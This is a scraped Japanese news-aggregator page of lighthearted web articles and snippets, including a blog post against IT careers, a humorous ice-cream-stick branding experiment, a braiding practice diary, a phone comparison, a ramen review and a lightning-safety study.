難易度的には東大に入るよりも難しいんじゃない？と思うほど

なので実際は IT 系を目指してもほとんどは底辺でブラックと言われる SIer とか SES などになる

IT 系エンジニアって一応は専門職だし、必要な知識が多いし、なりたいと思ってすぐなれるものでもない

高校や大学などからずっとそれ系にいたほうが有利だけど、そうすると行きたい会社に入れなかったからやっぱり別の職業にしようと思っても他に行くのは難しいことが多いと思う

人気のサービスの企業だと就活で戦う相手は小さい頃からずっとそれだけやってるガチ勢ってことは普通にある

そんな人に勝てるくらいにそれだけに時間をつぎ込むと他系は一般的なことすらできなかったりするもの

IT 系であれば何でもいいよって考えならともかく、いわゆる IT 系の良いイメージである企業に入りたいと思って IT 系を選ぶ場合は取り返しがつかない選択肢の可能性が高いと思った方がいい

また、そういった企業に入れたとしても、まわりは意識高い系ばかり

自ら勉強会を主催したり発表したりを当たり前のようにしてる人が多い

休日も趣味として技術力を高めてる人ばかり

IT エンジニアには起きてる間は本当にそれしかしてない異常者レベルの人も普通にいる

特別才能があるでもないと、プログラミングが趣味と言っても、色々ある趣味の一つで休日にプログラミングしてることもあれば他のことをしてることもある程度だとついていけないことが多いと思う

上位の企業に入れてもそれからが辛いし、入れなかったら体力的や精神的にブラックな企業行き

特別才能がある人でもないと勧められるところじゃないし、やめたほうがいいと思う

ツイートシェア
Title: IT 系に行くことはやめたほうがいいと思う

Link: https://dailyportalz.jp/kiji/winning-lottery-for-ice-cream
Content: 絶対に気をゆるめてはいけない。なぜならこんな危険が隠れているかもしれないからだ。

当たりくじ付きアイスを食べ進むうち、「ア、タ…」という焼印が出現、そこで手放しに喜んじゃあ、いないでしょうか？

アイスの「当たり」棒なんて、もう季節外れな話かもしれない。でも今だからこそ、言わせて欲しい。

あの小さな木片にこんなに手こずるなんて

「警鐘を鳴らす」などと力んでみたが、具体的に何をするかというと、「アイスの棒にさまざまな“警鐘焼印”を入れる」というだけである。どんな警鐘かは、最後のページで明かされる予定だ。

焼印を入れる「だけ」？果たして、そうだろうか。あの「アタリ」という焼き印、どう素人が入れられるというのか。

まずは、テスト用の棒を用意したい。あ、それには一本食べないとですね、調達できないわけですよ。もぐもぐ。

当たりくじ付きでないものを選んだ。ここで当たり出ちゃったら、目的を見失いそうで、えへへ。

うまかった。さあ、で、どうする。

焼印用の金属ゴテなんか作れるわけないから、代わりの方法を試してみたい。アルミテープを貼って、バーナーで焼いてみるのはどうか。うまく行きそうじゃないか？

台所の流し台の隙間に貼ったりするアイツです。

文字通り「アタリ」をつけて、と。

刃先ボロボロを覚悟で、文字の部分を切り抜き。

初めて使う、バーナー氏登場。

テープにすることで、文字を切り抜いたときにもアルミが棒からはがれなくて済む！頭イイ！なんて思っていたのだが。

ゴーーー。腰、引け気味真っ最中である。

お、焼かれたっぽいではないか！

どいーん。

何なんだ。全部焼けてるじゃないか。

準備しているときから薄々感じてはいたが、アルミを通して熱が全体に伝導してしまい、このように焼かれてしまうのだった。何とかなるかなーと思っていたけど、何とかならないもんだな、あはは。

もしかしてバーナーでは火力が強すぎる、とか？ではおなじみのチャッカマン氏ではどうだろう。

そういえば100円ライターは来年姿を消すんですってね。

なんて雑談してたら、「すす」で黒くなった。そのココロは「離し（話し）過ぎ」。こらダメだ。

もっと近づけてやってみる。

文字は出たが、ねばねばが気になるぞ。

このねばねばは、テープに塗られた接着剤が溶けたものだろう。お湯で洗ってもとれない。しかも文字も結局はすすみたいなもんだから、薄くなってきやがった。

接着剤、これは痛い。もっとこう、ペリッと取れたりするのを軽く想像していたから、予想外の障害だ。これ、最終的にはアイスに突っ込んで食べてみる、という企画だから、こういうデンジャラスなものがくっ付いていてはならないのだ。

テープは止めだ。６００円以上したけど、止めだ止めだ。

いったん広告です

なんとまだ続く

では接着剤を使わない方法で行おう。すなわち、ただのアルミホイルで覆うのだ。だがそれをまたバーナーなどであぶると進歩がない。電化してみよう。

若干不安はある。

なぜなら「タ」の中央の部分など、周囲を切り抜いてしまう部分はどうするかって話だ。

そこで、そういう部分が下に落ちない、水平に焼けるトースターが役に立ってくるわけだ。

180度で10分、それでも足りず220度で10分、もう一回10分、など恐る恐る焼いていた。アイスの棒なんかで火を出したくないからさ。

そしたらぜんぜん焼けないんだな。もう待てん。

あえて避けていたハンダゴテを投入。

もう仕方がない、ふだん電子工作などに使っているハンダゴテを使おう。自分の力の入れ加減で焼け具合が変わってしまうかもしれないので、遠ざけていたのだ。

そしてもうひとつ。普段はこの先っちょでハンダを溶かしたりしている。そんなもんでアイスの棒を焼くなんて、デンジャラスもいいとこではないか。しかし今までの失敗から、こういうことが言える。

先っちょをアルミホイルで巻けばいい。

それでも難なく焼ける。最初っからこうすりゃ、良かった。

だがホイルの抜き型に頼りきってなぞっていたら、やっぱりその下も焼けてしまうわけである。学習しないヤツ。

かくして、ついにアルミホイルも脱ぎ捨てるということに相成った。まわりまわって、結局は自分の腕一本で勝負である。

いったん広告です

なんとまだ焼いてる

やっと本番の棒に焼き付ける段階となった。が、ここにも不確定要素がある。



最終的に、また元のアイスに棒を戻して、用例を寸劇で見せたい。そのためには、なるべくアイスは無傷のまま棒を取り出したい、しかしうまくアイスから棒を引っこ抜けるのかどうか。アイス居合抜きである。居アイス抜きとでも言おうか。いやどっちでもいいが、アイスの棒の世界には未知の部分がまだまだあるのだ。

ここで登場するのが、当たり付きでおなじみのコレ。

まず、包丁でこわごわ縦に割ってみる。

崩れるけど、取り出せはする。しかしなるべく原型をとどめる方法はないものか。

魚をさばくように、アイスを。ガリガリ君を。3枚に下ろす。



ここで崩れたとしても、押し固めて復元すればいいか、なんて思っていたが、ふと思い立って力ずくで引っこ抜いてみた。崩すのが怖くてやらなかった方法だ。

もう、簡～単。

まず棒を少しづつキュキュキュキュねじり、だましだましゆっくりやってみたら、簡単に抜けた。そのうち、えいっとまっすぐ引くことでもっと簡単に抜けるように。アイス居合抜き、いや居アイス抜きの免許皆伝である。今、アイスの棒を抜かんと欲すれば乙幡より他に頼む者はあらず。



そうやって確保した棒たちを乾かし、やっと本番の焼付けへと進むのだった。

ペン（ハンダゴテ）を立て気味に持ち、ゆっくりと、絵手紙を描くように。

書き取り帳のように、最初点線でだいたいの位置を記す。鉛筆で下書きするわけにもいかないからな。

「ア、タ、…」次はなんとする？ところでコレ、真似して違法にアイスをせしめないようにネ♪

描き終わり、元のおうちへ帰される棒たち。

こうして、「アタ」と見るや諸兄においてはうっかり「当たり」を確信しがちな昨今であるが、次のようなケースもないことはないと思わずにはいられないので、よく覚えて帰って欲しい。

いったん広告です

○○拳、もしくはどっかに足の小指ぶつけた感じ

おっ！

おほ！これは！

やったー当たり…ん？何か違う。

アタタ？安達太良（アダタラ山）？

「アタタタタタタ」、かー…。

いったん広告です

江戸っ子アイス

やった、当たりだ！

「当たり棒？」

あたぼうよ！って何がだ。

いったん広告です

受験用の知識でしかないのだが

やった、当たりだ！

え、無し？

キリスト教の一派かー。

ロックなアイス

やった、当たりだ！

値？！

あんた、あたいの何なのさ。

朗々と読み上げたい

やった、当たりだ！

アタ、アタッカーYOU？

勧進帳、ですかな。

むしろ貴重

やった、当たりだ！

急にＱ数落ちた！

「与えられた数より小さい素数の個数について」。ドイツの数学者・リーマンが1859年に発表した論文のタイトルである。後世に多大な影響を及ぼしたという。

見なくなって久しい

やった、当たりだ！

と思ったらアダチ、さあどのアダチだ。ミツルかユミってとこだろう。

ユミ、想定内ではある。

と思ったら母だったでござる。

いきなり場所は変わって、「あぢー、あぢー」

こういうときは、アイスをだな。

当たりくじ付きではあるが、もう大人なので特に気にかけずにいただくわけだな。

…などと無心に食べ進めば、「アタ」（当たり）の文字。

うーん、もう一本。イヤッホウ！

もう知らない人のほうが多いんじゃないか。

「－－－－－－」終了音。

このように、少しくらい焼印が見えたからといって、油断してはならないのだ。すっかり頭の温まってしまったこの季節、くじ付きアイスにはことさらに注意深く臨んで欲しい。

それにしても本当の当たりが1個も出なかったのだ。
Title: アイスの当たりくじ、「アタ…」に油断するな （デジタルリマスター）

Link: https://anond.hatelabo.jp/20240218173356
Content: 「免れた」という言葉あるよね。「被害を免れた」「罰金刑を免れた」などで使われるあれだ。 これ、ずっと「まぬがれた」だと思っていた。しかしそれは一般的な読み方ではないこ...
Title: 漢字が似てるから仕方ないけど 濁るのは兔れるのほうで 点がない免れるは濁..

Link: https://togetter.com/li/2316625
Content: 業者さんが数人きたんだけど、猫がいるので玄関を閉めておいて欲しい旨伝えたらゴツい男性たちが 『猫ちゃんがいるので閉めといて』 『猫ちゃんいるんだ』 『猫ちゃんがいるので閉めまーす』 と伝達しててよかった

リンク www.amazon.co.jp

超ド天然イケメン上司と才色兼備な部下の微妙で絶妙なおとぼけラブコメディ SNSでファンの熱い支持を受けるオフィス・ラブコメ「うちの上司は見た目がいい」が待望の書籍化! “見た目がいい”速水部長はそのスマートな外見と正反対の超ド天然上司。彼のフォローをするのが才色兼備の部下、青山さん。二人のやり取りは時に親子のようで時に姉弟のようで時に……。周囲の人物も盛大に巻き込んで二人のマイペースな日々は進んでいくが? 本書には、速水部長と青山さんの部下で、彼らに振り回される安西くんの恋愛物語「隣の安西くん」や、イケメ
Title: 業者さんに『猫がいるので戸を閉めて』とお願いしたら情報伝達がかわいすぎた「これは良い現場」

Link: https://nlab.itmedia.co.jp/nl/articles/2402/16/news186.html
Content: 「妻の人間性を完璧に捉えている」と投稿された、妻の中学生時代の通知票がX（旧Twitter）で話題になっています。記事執筆時点で約22万件の“いいね”を記録。担任からの“メッセージ”の変化が分かりやすい……！

べた褒めからの……

Xユーザーのpokutuna（@pokutuna）さんが「愛する妻の中学のころの通知表」を公開しています。その担任所見欄をみると、1学期は「その明るさ、性格の良さ、そしてがんばりを続けて下さい。クラストップの成績、よく努力しました」とべた褒め。しかし続きを見てみると……。

2学期「力をゆるめましたね」

3学期「人の話をよく聴こう」

と、一気に短文になり、やんわり指摘する文章に。これだけ見ると「何があった!?」とびっくりしちゃう！

1学期から3学期の落差がすごい

そんな学生時代の通知表ですが、pokutunaさんが「妻の人間性を完璧に捉えている」と共感・納得しているところに、夫婦の仲の良さを感じてほっこりします。もしかしたらスタートダッシュを頑張りすぎちゃうタイプなのかもしれませんね。

ネットでは「子どもの時の通知表はまじで人としての本質ついてきてて笑うよね」「今自分のを読んでみても、先生はよくみてるなぁて感心する」といった声から、「すてきな奥様なことがこの通知表だけでものすごく伝わるね」と和む声が寄せられ話題に。また「ありのままの嫁さんを愛してる（投稿者さん）いいね」などの声も上がっています。

ちなみに歌や絵、工作・デザインの欄に丸がついていますが、現在pokutunaさんは妻が描いた“らくがき”をグッズにしてSUZURIで販売中。こちらは緩いワンコのイラストがかわいらしいデザインとなっています。

画像提供：pokutuna（@pokutuna）さん

advertisement

1|2|3 次のページへ
Title: 夫「妻の人間性を完璧に捉えている」　担任のコメントが急転直下な“妻の中学生時代の通知票”が話題に

Link: https://himasoraakane.wordpress.com/
Content: サイトの構築。作品の販売。ブログの投稿。この他にもさまざまな機能があります。
Title: サイトのタイトル

Link: https://anond.hatelabo.jp/20240217165523
Content: 「オカンが言うにはセブンイレブンが流行らせてコンビニの定番となった商品らしい。」 「それやったらドーナツではないやない。ドーナツはセブンイレブンで全然流行らんかったんや...
Title: 本日の学び

Link: https://togetter.com/li/2316333
Content: これが何なのか未だに謎が解けてないんだけど 右上のマーク？が御祝儀袋の のし っぽくてなんか目出度ぇなってずっと思ってる x.com/aki_sawaka/sta…
Title: トイレにあるこれ、何？「隣と会話できるやつ」「日本人男性のサイズの統計取ってる」→実は超有能なやつだった

Link: https://dailyportalz.jp/kiji/mitsuami-rensyu-1kagetu/page/2
Content: 知見共有の場です

ここからは毎日の練習の中でわかったことを伝えていきたい。

1. 手と髪の数が合わなくてパニック、でも慣れる

やり始めて最初に思ったことはこれだ。

手が足りないのだ。

両サイドに分けた髪の毛をそれぞれの手で持って、「あれ？真ん中の髪の毛はどうすれば……？」となる。もうパニックだ。

こうなったときに次にどうしたらいいか、もうわからない。誰か助けてくれ！！

どうにか指で髪の毛を押さえながら編んでいくが、絶対にこの持ち方じゃないだろうなと自分で思うほど我流になった。

でも、練習していくうちに急に指の運び方がわかって、髪の毛の最後の方まで編めるようになった。みんな安心してほしい。

はじめは4山？くらいしか編めなかったが、最終的には7山くらいいけるようになった。これが……上達……！

2. とにかく髪の毛を均等に分けることが重要だ

まず左右に髪の毛を分ける → 分けた髪の毛を3つに分ける → 3つに分けた髪の毛を編む

という流れでやっていくので、編む前の「髪の毛を分ける」という作業が実はだいじ、ということがわかった。

バランスが悪いと編んだときの形がよろしくなくなる。

なんか……ここだけ太いな……という気持ちになって、ほどいてやり直ししたくなる。朝の時間にそんなにやり直しをする余裕はない。気をつけよう。

3. 手を濡らすとやりやすい

上で髪の毛を分けるところがだいじだ、と書いたが、手を濡らすとやりやすくなるのでおすすめだ。

……めちゃくちゃ当たり前のことを書いているのでは？という気がしてきた。

でも、まとまり方が違うんだ本当に。だから僕のように不器用をウリにしている人はやってほしい。

4. 分け目をギザギザにするとかわいいと一般に言われている

最初に髪の毛を2つに分けるとき、分け目がギザギザになるようにするとかわいいらしい。

「三つ編み 分け目 ギザギザ」で画像検索するとたくさん出てくる。

正直あんまりピンときていない。まっすぐ分けてもいいような気がしているのだけど……。

とはいえ特に信念もないので見よう見まねでギザギザにしてみたりしている。

5. 二つ結びにしない三つ編み、序盤が難しすぎる

すでに書いたように、これまでは二つ結びにした上で三つ編みにしてきた。

さらに上のステージへ行くぞ、ということで二つ結びにせずに三つ編みをやってみる。

……3つに分けた上で編み始めるところが難しいんだ、これが。

髪の毛がすぐにバラバラになる。

二つ結びにしておくと髪の根本が固定されるのでやりやすかったが、同じことを自分の手でやらないといけない。

慣れていたのにまた「手が足りない！」とパニックだ。

一旦編み始めればあとはこれまでと同じなので、最初だけが肝心だ。

でも、こっちの方が三つ編みって感じでいい。まだ練習が必要。

6. 出来ることが増えて楽しい

「髪の毛を編む」ということが出来ると、色々な髪型を試してみたくなる。

1ヶ月練習しただけでスキルアップを感じられて楽しい。

向上心が止まらないぜ！！ということで、学びのための本も買った。

キャプション表紙のキラキラさがすごい。「めちゃ♡♡♡カワ！！」って書いてあるな。

完全に女子小学生が買うやつだ。

本屋で子ども向けのヘアアレンジが載っている本を探したらこれしかなかった。

イラストで手順が書いてあり、最高に参考になる。（新星出版社 めちゃカワ!!はじめてのヘアアレンジ カリスマコレクション P48・49より）

そして、三つ編みには表三つ編みと裏三つ編みがあることを学んだ。

表千家と裏千家以外にも表や裏があったのか……。

これまでやっていた外側の髪を内側の髪の上に交差させるのが表三つ編みで、下に交差させるのが裏三つ編みだ。

並べると髪の流れが違っていて面白い。へーへー。

知らないことばかりである。

本をレジに持っていくときに何らかの法に触れるのではと思うほど自分とかけ離れた本だったが、買った甲斐があった。
Title: 子どもの三つ編みを1ヶ月練習してわかったこと

Link: https://togetter.com/li/2316181
Content: 小さい画像だと特にそう見える 数字の縦の線が強調されるからかな…？

タイ語がわかる人も騙されちゃうレベル
Title: なんでタイ語のチラシが入ってるんだろう？と思ったら…ネイティブも「謎タイ語」に見えてしまう不思議な画像「サムネだと余計にそう見える」

Link: https://togetter.com/li/2316170
Content: このツイートは権利者によって削除されています。

このツイートは権利者によって削除されています。

一方で「何がミスなんだ？」という意見も多数

指示が難しかったのかも
Title: 正解がわからん...職場で「これでドーナツでも買って来て」と一万円札を渡され、一万円分のドーナツを買ってきたうっかりエピソードに「何が変なの？」

Link: https://rocketnews24.com/2024/02/17/2174968/
Content: 失くして初めて分かることがある。当たり前に持っていたからこそ分からなかったそのありがたみ。今はただただ過去の日々が輝いて見える。iPhoneのことなんですけどね。

2024年の正月、ビックカメラの「先着10名・SIMフリースマートフォン福箱」でXiaomi Japanの『Redmi Note 11 Pro 5G』を入手した私（中澤）。初めてのSIMフリースマホ！ 初めてのAndroid!! でも、1カ月使った今、iPhoneの凄さを思い知る日々です。

・文字情報だけ見たらめっちゃ良いと思った

私が使用していたのはiPhoneXなので発売年は2017年。一方のRedmi Note 11 Pro 5Gは2022年に発売されたもの。ゆえに、カメラも1憶800万画素とiPhoneXの9倍の画素数がある。

ストレージも「6GB(RAM)+128GB(ROM)」あり、何やら最大1TBまで拡張できる様子。64GBのiPhoneXをギリギリでやりくりしていた私にとっては、広い水槽のように感じられた。

何よりAndroidはSDカードが使える。職業柄データ移行することが多いんだけど「iPhone→PC」でデータ移行しようとすると、動画の移行が詰まってできない場合がある。

・慣れではない

バックアップもiTunesだったり、データの扱いにイライラすることが多かったので、SDカードが使えるのはマジで嬉しい。慣れるまでは操作的に多少使いづらいだろうけど、それは慣れればいいだけだ。

と思っていたのだが、そんな問題じゃなかった。iPhoneって凄かったんだなあ。機種変更1カ月で実感したiPhoneの凄さを以下に記載したい。

・カメラ

前述の通り、画素数の数字にビビっていた私だが、実際1カ月使ってみると、なんかiPhoneで撮った画像の方が綺麗に感じる。くっきりしていて色合いもハッキリしているのだ。iPhoneのくっきり感に比べると、Redmi Note 11 Pro 5Gのカメラはちょっとアプリのフィルター感がある。

あとブレなさや暗闇への強さもiPhoneは凄かったな。iPhoneのノリで撮ったらブレブレになるので今はシャッターをかなり慎重に切るようになった。数秒感静止してから、シャッターを押してまた数秒間静止。

シャッターを押した後も静止するのは、ほとんどの場合カメラがすぐに反応しないからだ。シャッターを押したらほぼリアルタイムに「パシャッ」と撮れる反応のスムーズさが懐かしい。

・アプリの安定感

続いて、感じたのはアプリの安定感。これは私が色んなSNSで演奏動画を投稿しているからかもしれないが、Redmi Note 11 Pro 5GはSNSごとの音ズレが結構気になる。

具体的に言うと、PCで動画と音を合わせてスマホに投稿したとする。で、X（Twitter）に投稿するとPCでは合ってた音がちょっと遅れてるのだ。試しに同じ投稿をiPhoneで再生してみたら、動画と音が合ってたので、おそらく再生に際して遅れてるだけなのだが……

TikTokだとそのズレが半拍くらいに開いていたりする。要するに、アプリごとの相性のバラつきが使っていて実感できるくらい大きいのだ。

LINEも文字を打った後、しばらく固まってから反映されることが多いから同じ文字を連打してしまったりすることがある。全部のアプリがスムーズに動くのって凄いことなんだなあ。

・落ちない

上記の文字入力のズレは日常的動作がウマくできない感じのストレスがあるのだが、さらにイライラするのがそのままダウンした時。アプリが強制終了されて、しばらくスマホが操作不能になった挙句、ロック画面に戻るのだ。

この現象が1カ月で「またかよ！」と思うくらい頻発している。ちなみに、今TikTokをイジってたら落ちた。TikTokは投稿しようとすると1工程ごとに固まるレベルなので相性はかなり悪いと言わざるを得ない。

iPhoneXでも確かに落ちることはあった。でも、たまにだったのであまり気にならなかったのである。気にならないくらい落ちないのって凄いことだったんだなあ。

iPhoneを使ってる時は、Androidが良いように見えたんだけど、1カ月間使ってみた結果、iPhoneの凄いところばかり気づかされた。隣の芝は青く見えるというヤツでした。トホホ。

それにしても、5年後に発売されたAndroidでさえこれなんだから、iPhoneって本当にバランスが良いと思う。機能が特化してる部分が絶妙に痒い所に手が届いているのだ。

もはやスマホがインフラと言われる時代。機種変更して初めて気づくiPhoneの凄い点がそれを証明しているような気がした。

執筆：中澤星児

Photo：Rocketnews24.
Title: 【検証1カ月】iPhoneの時は気づかなかった！ 福袋に入ってたAndroidを使ったら分かったiPhoneの凄さ

Link: https://anond.hatelabo.jp/20240216195050
Content: 古典的ジョーク ビルゲイツが初夜のとき新妻に言われた。「あなたがなぜ microsoft という名前にしたか今わかったわ」
Title: マイクロでソフトなんだけど

Link: https://togetter.com/li/2316099
Content: 考えさせられる
Title: 高校三年生で40歳の塾講師と付き合ってた姉が親に猛反対された結果…音信不通になり冠婚葬祭だけ現れる存在になってしまった話

Link: https://dailyportalz.jp/kiji/mitsuami-rensyu-1kagetu
Content: ということで1ヶ月ほど練習しました。

もうすぐ4歳になる娘の髪を結ぶのが朝のルーティンになっている。 一番簡単な二つ結びをずっとしていたのだが、さすがに忍びない。 三つ編みくらいは出来るようになった方がいいのではないか。

ヘアアレンジ初心者から脱却したい

妻の始業時間が早すぎるのと、僕の始業時間が遅すぎるので、子どもの朝の支度は僕の担当になっている。

朝ご飯を作って食べさせて、ハミガキをして、着替えさせて、幼稚園まで送る。

朝の時間は戦争だ。

その一連の流れの中で「髪の毛を結ぶ」という工程がある。

自分の髪も他人の髪も結んだことはない。これまでの人生で経験がない作業だ。

ということで一番簡単であろう二つ結びをやることにした。1歳のときのむすめ、かわいいな！（心の声）

髪を二つに分けてゴムで結べばいい。これならさすがに業界未経験でも安心だ。

前髪が長くなったときはゴムで結んで、くるっとしたりした。これ「くるりんぱ」って言うらしいですよ。あまりにそのまんまだな。

くるりんぱなど若干のアレンジは入ったが、基本的には二つ結びをずっと続ける毎日だった。

しかしこれを2年半くらい続けていくと、さすがにワンパターンすぎて気になってくる。

何より進歩がない。仮にも大人が毎日やっていることなのだから、何かしらステップアップした方がいいじゃないか。

ということで毎日三つ編みを練習することにした。

髪を結ぶといったら三つ編みだろう。

……ところで三つ編みってどうやるんですか。そこからのスタートである。業界未経験だから仕方ない。

同じように業界未経験の人に向けて説明したい。こんな感じで髪を3つの束に分けまして、

横にある髪を真ん中の髪の上にまたがせて、

もう一方の髪も同じようにまたがせて、

繰り返すとこんな風になる。これが三つ編みだ。

三つ編みのやり方くらい知ってるよ！という人の方が多い気がするが、今回は狭い層に向けた"情報"の記事なので基本的なところからいきます。

いったん広告です

三つ編み修行だ！

やり方がわかったところで初トライだ。結果はこちら。

ほら、初めてだからさ。ね。

言い訳から入っちゃうな。ひとまず結ぶことは出来ているけど、めちゃくちゃ短い。あと片方だけやってあきらめてます。

ここから毎朝、娘が朝ごはんを食べている隙に三つ編みを練習していった。

そして1ヶ月続けると、こうなりました。

見て！！！！

出来てると言っていいでしょうこれは！

練習すると上達する、という当たり前のことを改めて実感する。

結び目がうまくいくと気持ちがいい。

あと、二つをした上で三つ編みをしているのでやりやすい。



初心者はここからやるのがいいだろう。

（二つ結びをしないでの三つ編みはあとで出てきます）

日々の成果。だんだん良くなっている。あとずっとテーブルの上が散乱しているが、朝の時間は戦争だからさ、見逃してほしい。

⏩ 練習の中でわかったことを共有します
Title: 子どもの三つ編みを1ヶ月練習してわかったこと

Link: https://anond.hatelabo.jp/20240217023536
Content: ダジャレで笑みがこぼれるのを抑えられなくなった時 自分の老いに俺は割と本気で泣いたよ
Title: 幼稚園児がリングに近づいてるよ危ないね

Link: https://togetter.com/li/2315989
Content: 急なスキップ 🐶「なんすか飼い主どうしたんすか」 続くスキップ 🐶「どうしたんすかあっなんか楽しい感じすか？！」 一緒にスキップ 🐶「たーのしーい！ヒャホー！」 こんな感じに見えましためちゃくちゃかわいかったですー！！ x.com/2x7xxx/status/…
Title: 大きめのわんこが散歩中に動くの拒否になったら飼い主はどうするの？→めちゃくちゃ楽しそうな解決方法があった「私もやってる」

Link: https://rocketnews24.com/2024/02/16/2174272/
Content: 名物とかB級グルメと言えば地方都市の専売特許。東京に近づくにつれて、全部ある感じになるので「この街はこれ！」というのが無くなる。

神奈川県川崎市も東京近郊の大都市なのでそういうイメージだったのだが、川崎の地元民にオススメの食べ物を聞いてみたところ「これしかねえ」と謎の酒場に連れて行かれた。そこがマジで個性の塊すぎたためお伝えしたい。

・川崎市民まっしぐら

ドヤドヤした夜の川崎東口の繁華街。路地裏を行き交う人の中に水商売的な雰囲気が漂っているところは、池袋や歌舞伎町みたいな夜の街オーラを感じた。その中をスイスイ進んでいく背中はさすが地元民の心強さがある。

ここまで読めば大体察しがつくと思うが、私（中澤）は川崎にほぼ来たことがない素人。ゆえに、友達に軽いトークのつもりで「なんかオススメない？」と聞いてみたわけ。

大体は「ない」と返ってくるこの質問。しかし、まさか川崎で「これしかねえ」というものがあろうとは。

・謎の酒場

「とりあえず川崎に来たら1回は食べた方が良い」と言う彼。そんな彼が入っていったのは薄暗いビルの2階にある真っ赤な入口。煌々と光る看板にはこう書かれていた。『元祖ニュータンタン酒場』と。

元祖と言われましても、そもそもニュータンタン酒場を知らない。っていうか、ニュータンタンって何やねん。そこでメニューを見たところどうやら担々麺のようだ。

・担々麺ではない

川崎市民いわく「中辛以上が本当の味」とのこと。そこで「タンタンメン（税込910円）」の中辛を注文してみたところ……

知ってるタンタンメンと全然ちげえッ！

私も担々麵に詳しいわけではないが、とりあえず中辛でこの赤さはおかしいだろ。肉そぼろ以外に溶き卵がふんだんに入っていて、表面が卵がゆみたいになっているのも初めて見るパターンだ。だが見た目だけでなく、味も私が知っている担々麵と全然違った。

・味の違い

担々麺はゴマが香るまろやかな旨みの中にピリッと辛さが効いているイメージだったが、香るのはゴマじゃなくニンニク。唐辛子と別にニンニクの辛みを感じるくらいニンニクがめっちゃ入っている。

ゆえに、辛さがなかなか暴力的だ。丸くて太い麺の外側はモチッとしてるけどパツッと切れる食感も独特。ウマイ以上になんか強い。1度食べると忘れられないくらいのパンチがあった。

・成り立ち

その味の強さはどことなく海外の現地料理みたい。ちょっとしたとっつきにくさがあるというか。と思っていたら、壁に貼ってあったグループ紹介にこう書かれていた。

「スタミナがつく料理をと創業者が中華料理の担々麵をアレンジしたのが始まりです。担々麺をアレンジしたということで「ニュータンタンメン」と命名」

──創業55年で現在では川崎市を中心に30を超える店舗数を展開しているのだとか。確かに、川崎に根付いているものの様子。

・酒場は川崎にしかない

ちなみに、ロケットニュース24でも以前、佐藤英典記者が池袋の元祖ニュータンタンメン本舗をレポートしていた。どうやら東京や埼玉、長野、宮城などにも進出している模様。

しかしながら、ニュータンタン酒場なのはここだけのようだ。さすが本場。ただのラーメン屋ではなく、メニューもおつまみ系がバリエーションに富んでいる。お酒もビール、ハイボールはもちろん、焼酎、酎ハイ、カクテル、日本酒、紹興酒まであった。

・これしかねえ

なお、案内してくれた川崎市民の話によると、「日本に担々麺が少なかった時に、創業者がガチで中国で担々麺を食べてできたのがニュータンタンメンらしいよ」とのこと。

そう考えると、私が感じた他の担々麺との違いや海外の現地料理的なとっつきにくさは、元ネタへの距離の近さから来ているのかもしれない。これもアレンジされているものとは言え、個人の研究と日本カラーが確立された後ではやっぱりアレンジ深度が違うだろうしな。

ゆえに、なんかオリジナリティーがヤバイことになっているニュータンタンメンはまさに独自進化と言える。食べた後、確かに「これしかねえ」と思ったのであった。

・今回紹介した店舗の情報

店名 元祖ニュータンタン酒場

住所 神奈川県川崎市川崎区砂子2-11-20

営業時間 平日17:00～24:00、金曜17:00～27:00、土曜11:30～15:00 / 17:00～27:00、日曜11:30～15:00、17:00～24:00

定休日 無休

参考リンク：元祖ニュータンタンメン本舗

執筆：中澤星児

Photo：Rocketnews24.
Title: 川崎の地元民にオススメの食べ物を聞いたら「これしかねえ」と謎の酒場に連れて行かれた話

Link: https://nazology.net/archives/145271
Content: 実は雨に濡れている方が生存率は高まる？

これまでの研究で、もし雷に打たれた場合、乾いているよりも水に濡れている方が人体を通過する電流が小さくなる可能性が指摘されていました。

動物への放電実験でも、乾いたままの個体では10匹中3匹しか生き残らなかったのに対し、水に濡らした個体では10匹中5匹が生存したと報告されています。

しかし、この仮説が人間に当てはまることを示す証拠はまだありません。

そこで研究チームは今回、人間の頭部を模倣したモデルを作り、そこに落雷を再現した放電実験を行いました。

チームはヒト組織の電気伝導率を反映させるため、脳・脳頭蓋・頭皮の3層構造で模型を作り、塩化ナトリウム、カーボンブラック、グラフェン、寒天様物質などを用いて、頭部の導電性や質感を再現しています。

実験用に2つの頭部モデルを作成し、片方は乾いたまま、もう片方は人工雨水を吹きかけました。

そして2つの頭部モデルに電極を接続した状態で、落雷に伴う放電と同等の電流を与えます。

10回のシミュレーションを行った結果、どちらの頭部モデルでも電流が頭皮表面をすばやく横切る様子が観察されました。

ところが頭部の乾いた条件と濡れた条件では大きな違いが見られています。

放電の直後、水に濡れた頭部では乾いた頭部に比べて、表面を流れる電流の強さが12.5%低く、さらに頭部内側の脳が受けるエネルギーも32.5%低くなっていたのです。

これは明らかに水に濡れた状態の方が脳に与えられるダメージが少ないことを示しています。

加えて、水に濡れた頭部モデルは放電による頭皮の亀裂や穿孔（せんこう：穴が空くこと）などの損傷が乾いた頭部モデルに比べて少なくなっていました。

水に濡れた方が頭部に流れる電流量が少なくなる理由については、まだ確かなメカニズムは明らかになっていません。

それでもチームは、おそらく水の層が保護膜のような働きをすると同時に、頭部の温度で蒸発する水蒸気によって空気中に電流が逃げるため、わずかではあるが皮膚を直接流れる電流が減少する可能性があると推測しました。

研究者は「頭皮の雨水の膜は、脳に流れる電流を減らし、損傷から保護する可能性のある殻のようなものです。落雷において電流は直接体を通るのではなく、より電気が通りやすい皮膚上の濡れている経路を選ぶからです」と話しています。

以上の結果から、落雷時には意外にも雨に濡れている方が乾いているよりも生存率が高まることが示唆されました。

現在、人が落雷に当たる確率は100万分の1と言われており、日本での落雷の被害者は年間で約10〜20人、世界でも約1000人程度に留まっています。

また落雷被害のうち、多くは自然物や建物から雷が人体に飛び移る「側撃雷」であり、雷が人体に直撃するケースは全体のわずか5%と極めて低いです。

そのため、普段から落雷に撃たれることを心配している人はそうそういないでしょう。

とはいえ、実際に落雷やそれに伴う放電で死亡するケースはたびたび報告されています。

そうした中で、稀に落雷にあっても生存する人がいます。落雷で助かる人と助からない人にどんな違いがあったのかは、興味深い点ですがその要因の1つとして、濡れていたかどうかは重要な差になるかもしれません。

もし外出中に急な雷雨に遭遇したとき、最もベストな対処法は建物や屋内に避難することです。

しかし万が一、近くにそうした避難所がなく、周囲に落雷を誘引するものが何も無い状況なら、いっそのこと雨に濡れてしまった方が最悪の場合に命拾いするかもしれません。
Title: ゲームとは逆？落雷は濡れている方がダメージは少ない - ナゾロジー

Link: https://nazology.net/archives/145188/2
Content: AI技術を使用して受信画像のクリーンアップを実現した

そこで今回の研究ではまず、カメラから検知された電磁波放射パターンと撮影された映像の間に、予測可能な関連性があるかが確認されました。

